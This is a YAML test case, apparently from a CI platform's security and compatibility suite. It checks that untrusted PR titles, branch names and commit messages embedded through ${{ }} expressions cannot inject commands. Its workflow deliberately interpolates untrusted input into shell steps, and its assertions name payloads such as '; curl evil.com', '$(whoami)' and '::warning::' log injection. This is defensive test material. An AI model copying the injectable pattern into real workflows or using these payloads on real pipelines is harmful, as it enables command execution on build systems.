id: COMPAT-INJECT-02-001
dimensions:
  - compatibility
  - security
dimension: compatibility
priority: P1
title: "不可信输入注入防护对标：验证 PR 标题/分支名/commit message 在表达式中的处理安全"
intent_ref: INTENT-COMPAT-026

setup:
  repo_fixture: basic-ci
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    test-injection:
      name: Test Injection
      runs-on: [dedicate-hosted, x64, large]
      steps:
        - name: Test PR title embedding
          run: 'echo "PR title: ${{ atomgit.event.pull_request.title }}"'
        - name: Test branch name embedding
          run: 'echo "Branch: ${{ atomgit.ref }}"'
        - name: Test commit message embedding
          run: 'echo "Commit: ${{ atomgit.event.head_commit.message }}"'
        - name: Verify no command injection
          run: |
            echo "Injection test passed"
            echo "No unexpected commands were executed"

trigger:
  event: pull_request
  as: untrusted_contributor

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: "deterministic"
    rubric: "PR 标题通过 ${{ }} 嵌入 echo 参数正常工作"
  - type: negative
    target: run_logs
    eval: "deterministic"
    rubric: "PR 标题中的命令注入 payload（; curl evil.com）不被执行"
  - type: negative
    target: run_logs
    eval: "deterministic"
    rubric: "分支名中的 $(whoami) 等命令替换不被执行"
  - type: negative
    target: run_logs
    eval: "deterministic"
    rubric: "commit message 中的 ::warning:: 不注入日志注解"

teardown:
  reset: fixture
